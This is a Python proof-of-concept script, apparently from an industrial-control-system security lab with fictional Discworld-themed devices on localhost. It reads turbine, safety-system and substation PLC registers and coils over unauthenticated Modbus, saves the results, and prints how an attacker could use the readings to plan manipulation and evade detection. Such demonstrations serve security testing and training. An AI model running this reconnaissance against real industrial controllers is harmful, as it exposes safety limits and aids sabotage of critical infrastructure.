#!/usr/bin/env python3
"""
Proof of concept: Unauthorised reading of turbine control parameters
This demonstrates that an attacker could read sensitive operational data
including setpoints, alarms, and safety limits from the turbine PLCs.

NOTE: This is a READ-ONLY demonstration. No values are modified.
"""

import json
from datetime import datetime
from pathlib import Path

from pymodbus.client import ModbusTcpClient


def read_turbine_config(plc_ip, port, unit_id):
    """Read turbine configuration without modifying anything"""

    client = ModbusTcpClient(plc_ip, port=port)

    if not client.connect():
        print(f"    [!] Failed to connect to {plc_ip}:{port}")
        return None

    # Set the unit ID on the client for pymodbus 3.x
    client.slave_id = unit_id

    config = {}

    # Speed setpoint (holding register 0)
    result = client.read_holding_registers(address=0, count=1)
    if not result.isError():
        config["speed_setpoint_rpm"] = result.registers[0]
    else:
        config["speed_setpoint_rpm"] = None

    # Current shaft speed (input register 0)
    result = client.read_input_registers(address=0, count=1)
    if not result.isError():
        config["current_speed_rpm"] = result.registers[0]
    else:
        config["current_speed_rpm"] = None

    # Power output (input register 1, MW * 10)
    result = client.read_input_registers(address=1, count=1)
    if not result.isError():
        config["power_output_mw"] = result.registers[0] / 10.0
    else:
        config["power_output_mw"] = None

    # Steam pressure (input register 2, PSI)
    result = client.read_input_registers(address=2, count=1)
    if not result.isError():
        config["steam_pressure_psi"] = result.registers[0]
    else:
        config["steam_pressure_psi"] = None

    # Steam temperature (input register 3, °C)
    result = client.read_input_registers(address=3, count=1)
    if not result.isError():
        config["steam_temperature_c"] = result.registers[0]
    else:
        config["steam_temperature_c"] = None

    # Bearing temperature (input register 4, °C)
    result = client.read_input_registers(address=4, count=1)
    if not result.isError():
        config["bearing_temperature_c"] = result.registers[0]
    else:
        config["bearing_temperature_c"] = None

    # Vibration (input register 5, mils * 10)
    result = client.read_input_registers(address=5, count=1)
    if not result.isError():
        config["vibration_mils"] = result.registers[0] / 10.0
    else:
        config["vibration_mils"] = None

    # Overspeed time (input register 6, seconds)
    result = client.read_input_registers(address=6, count=1)
    if not result.isError():
        config["overspeed_time_s"] = result.registers[0]
    else:
        config["overspeed_time_s"] = None

    # Damage level (input register 7, percent)
    result = client.read_input_registers(address=7, count=1)
    if not result.isError():
        config["damage_level_pct"] = result.registers[0]
    else:
        config["damage_level_pct"] = None

    # Grid frequency (input register 8, Hz * 100)
    result = client.read_input_registers(address=8, count=1)
    if not result.isError():
        config["grid_frequency_hz"] = result.registers[0] / 100.0
    else:
        config["grid_frequency_hz"] = None

    # Grid voltage (input register 9, pu * 1000)
    result = client.read_input_registers(address=9, count=1)
    if not result.isError():
        config["grid_voltage_pu"] = result.registers[0] / 1000.0
    else:
        config["grid_voltage_pu"] = None

    # Read discrete inputs (status flags)
    result = client.read_discrete_inputs(address=0, count=6)
    if not result.isError():
        config["turbine_running"] = result.bits[0]
        config["governor_online"] = result.bits[1]
        config["trip_active"] = result.bits[2]
        config["overspeed_condition"] = result.bits[3]
        config["underfreq_trip"] = result.bits[4]
        config["overfreq_trip"] = result.bits[5]
    else:
        config["turbine_running"] = None
        config["governor_online"] = None
        config["trip_active"] = None
        config["overspeed_condition"] = None
        config["underfreq_trip"] = None
        config["overfreq_trip"] = None

    # Read coils (control flags)
    result = client.read_coils(address=0, count=3)
    if not result.isError():
        config["governor_enable"] = result.bits[0]
        config["emergency_trip"] = result.bits[1]
        config["trip_reset"] = result.bits[2]
    else:
        config["governor_enable"] = None
        config["emergency_trip"] = None
        config["trip_reset"] = None

    client.close()

    return config


def demonstrate_impact():
    """Show what an attacker could learn from this access"""

    print("=" * 70)
    print("[*] Proof of Concept: Unauthorised Turbine Configuration Access")
    print("[*] This is a READ-ONLY demonstration")
    print("=" * 70 + "\n")

    # Control system targets
    targets = [
        # Device: hex_turbine_plc, Type: turbine_plc, Description: Hex Steam Turbine Controller (Allen-Bradley ControlLogix 1998)
        ("127.0.0.1", 10502, "Hex Steam Turbine PLC"),
        # Device: hex_turbine_safety_plc, Type: turbine_safety_plc, Description: Turbine Safety Instrumented System
        ("127.0.0.1", 10503, "Hex Turbine Safety PLC"),
        # Device: reactor_plc, Type: reactor_plc, Description: Alchemical Reactor Controller (Siemens S7-400 2003)
        ("127.0.0.1", 10504, "Alchemical Reactor PLC"),
        # Device: library_hvac_plc, Type: hvac_plc, Description: Library Environmental Controller (Schneider Modicon 1987 + Gateway)
        ("127.0.0.1", 10505, "Library HVAC PLC"),
        # Device: library_lspace_monitor, Type: specialty_controller, Description: L-Space Dimensional Stability Monitor
        ("127.0.0.1", 10506, "Library L-Space Monitor"),
        # Device: substation_rtu_1, Type: substation_rtu, Description: Main Substation RTU - Unseen University Campus
        ("127.0.0.1", 10510, "Main Substation RTU"),
        # Device: scada_server_primary, Type: scada_server, Description: Primary SCADA Server (Wonderware System Platform)
        ("127.0.0.1", 10520, "Primary SCADA Server"),
    ]

    results = {}
    successful_reads = 0

    for ip, port, name in targets:
        print(f"[*] Reading configuration from {name} ({ip}:{port})...")
        config = read_turbine_config(ip, port, 1)

        if config:
            results[name] = config
            successful_reads += 1

            print(f"    Speed Setpoint: {config['speed_setpoint_rpm']} RPM")
            print(f"    Current Speed: {config['current_speed_rpm']} RPM")
            print(f"    Power Output: {config['power_output_mw']} MW")
            print(f"    Steam Pressure: {config['steam_pressure_psi']} PSI")
            print(f"    Steam Temperature: {config['steam_temperature_c']}°C")
            print(f"    Bearing Temperature: {config['bearing_temperature_c']}°C")
            print(f"    Vibration: {config['vibration_mils']} mils")
            print(f"    Overspeed Time: {config['overspeed_time_s']}s")
            print(f"    Damage Level: {config['damage_level_pct']}%")
            print(f"    Grid Frequency: {config['grid_frequency_hz']} Hz")
            print(f"    Grid Voltage: {config['grid_voltage_pu']} pu")
            print("    Status:")
            print(f"      - Turbine Running: {config['turbine_running']}")
            print(f"      - Governor Online: {config['governor_online']}")
            print(f"      - Trip Active: {config['trip_active']}")
            print(f"      - Overspeed Condition: {config['overspeed_condition']}")
            print(f"      - Under-frequency Trip: {config['underfreq_trip']}")
            print(f"      - Over-frequency Trip: {config['overfreq_trip']}")
            print("    Controls:")
            print(f"      - Governor Enable: {config['governor_enable']}")
            print(f"      - Emergency Trip: {config['emergency_trip']}")
            print(f"      - Trip Reset: {config['trip_reset']}")
            print()
        else:
            print(f"    [!] Could not read from {name}\n")

    if successful_reads == 0:
        print("[!] No control systems were accessible.")
        return

    # Save results with timestamp
    output = {
        "timestamp": datetime.now().isoformat(),
        "demonstration": "read_only_turbine_access",
        "systems_scanned": len(targets),
        "successful_reads": successful_reads,
        "systems": results,
        "impact_assessment": {
            "data_exposure": [
                "Operational setpoints and safety thresholds exposed",
                "Real-time operational state visible to unauthorized parties",
                "Safety margins and alarm thresholds revealed",
                "System architecture and register mapping discovered",
            ],
            "attack_enablement": [
                "Attacker could monitor operational states in real-time",
                "Configuration data reveals safety margins and operational limits",
                "Historical data collection could reveal production schedules",
                "Information enables planning of precise manipulation attacks",
                "Baseline establishment allows detection of anomalies attackers create",
            ],
            "business_impact": [
                "Intellectual property theft (operational parameters)",
                "Competitive intelligence (production efficiency)",
                "Safety information leakage enables targeted attacks",
                "Regulatory compliance violations (unauthorized access)",
            ],
        },
    }

    # Ensure reports directory exists
    reports_dir = Path(__file__).parent.parent.parent / "reports"
    reports_dir.mkdir(exist_ok=True)

    filename = (
        reports_dir
        / f'poc_turbine_read_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    )
    with open(filename, "w") as f:
        json.dump(output, f, indent=2)

    print("[*] " + "=" * 66)
    print(f"[*] Results saved to {filename}")
    print("[*] No modifications were made to any systems")
    print("[*] This demonstrates read-only reconnaissance capability")
    print("[*] " + "=" * 66)

    print("\n[*] IMPACT SUMMARY:")
    print("-" * 70)
    print("    An attacker with this access could:")
    print("    • Monitor real-time operational state")
    print("    • Map system architecture and register layout")
    print("    • Identify safety thresholds to stay below during attacks")
    print("    • Collect baseline data for anomaly detection evasion")
    print("    • Plan precisely-timed manipulation attacks")
    print("    • Steal proprietary operational parameters")


if __name__ == "__main__":
    try:
        demonstrate_impact()
    except KeyboardInterrupt:
        print("\n[*] Demonstration interrupted by user")
    except Exception as e:
        print(f"\n[!] Error during demonstration: {e}")
